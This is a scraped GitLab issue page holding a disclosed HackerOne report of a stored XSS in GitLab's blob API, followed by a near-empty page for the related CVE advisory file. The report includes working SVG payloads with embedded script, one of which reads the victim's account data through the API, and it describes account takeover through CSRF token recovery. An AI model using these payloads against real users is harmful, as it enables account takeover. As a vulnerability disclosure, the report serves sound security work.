=== Content from gitlab.com_54b8078b_20250119_125150.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# ESCALATED: Stored XSS in the blob APIs

**[HackerOne report #672150](https://hackerone.com/reports/672150)** by `rpadovani` on 2019-08-13, assigned to `jritchey`:

### Summary

Visiting the blob APIs through the browser trigger a stored XSS via a .svg file

This issue is similar to <https://hackerone.com/reports/651335> (tracked as gitlab-foss#65080 over Gitlab), meaning is a XSS in the APIs, but it is about a different component, since it is in a different endpoint (the other one is about files APIs, this is in blob APIs)

### Steps to reproduce

1. Create a repository
2. Create a SVG file like

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
     alert("surprise");
  </script>
</svg>
```

3. Find out its SHA, using the [List Repository Tree Api](https://docs.gitlab.com/ee/api/repositories.html#list-repository-tree)
4. Use the [Raw Blob Content](https://docs.gitlab.com/ee/api/repositories.html#raw-blob-content) API to trigger the XSS, such as <https://gitlab.com/api/v4/projects/13337155/repository/blobs/24a83dd041326bb5b8f723f2db3a6c9bd72397ad/raw> (I can give access, if needed)

### Impact

If we trick a user to visit the page (and we can use a lot of different ways to do so, e.g. including the link in a issue, or doing a redirect from an external website), we have complete access to their account.

We can use internal and external API, because we can also recovering the `X-CSRF-Token` easily from <https://gitlab.com/-/graphql-explorer>

We basically have access to the entire user profile,

### Examples

Practical example of invoking APIs

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    fetch("/api/v4/user")
        .then(res => res.json())
        .then(j => alert(j["email"]))
  </script>
</svg>
```

### What is the current *bug* behavior?

Stored XSS

### What is the expected *correct* behavior?

The svg is shown as plain text

### Relevant logs and/or screenshots

Attached video

### Output of checks

This bug happens on GitLab.com

## Impact

Basically account takeover with well crafted svg files

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [xss-blob-2019-08-13\_11.40.38.mp4](https://h1.sec.gitlab.net/a/f70e6dab-2e01-4f7f-b10f-563dcda6f022/xss-blob-2019-08-13_11.40.38.mp4)

Edited Feb 01, 2020 by [GitLab SecurityBot](/gitlab-securitybot)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_1f67736a_20250119_125149.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2020](/gitlab-org/cves/-/tree/master/2020)
* [**CVE-2020-13271.json**](/gitlab-org/cves/-/blob/master/2020/CVE-2020-13271.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2020/CVE-2020-13271.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2020/CVE-2020-13271.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Jun 22, 2020

  [e7d1e8ca](/gitlab-org/cves/-/commit/e7d1e8cac904950ddd4c9f21f080639fbe746419)
  [Publishing 17 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/e7d1e8cac904950ddd4c9f21f080639fbe746419)
  ·
  e7d1e8ca

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Jun 22, 2020

  e7d1e8ca

  [Publishing 17 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/e7d1e8cac904950ddd4c9f21f080639fbe746419)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Jun 22, 2020

Loading


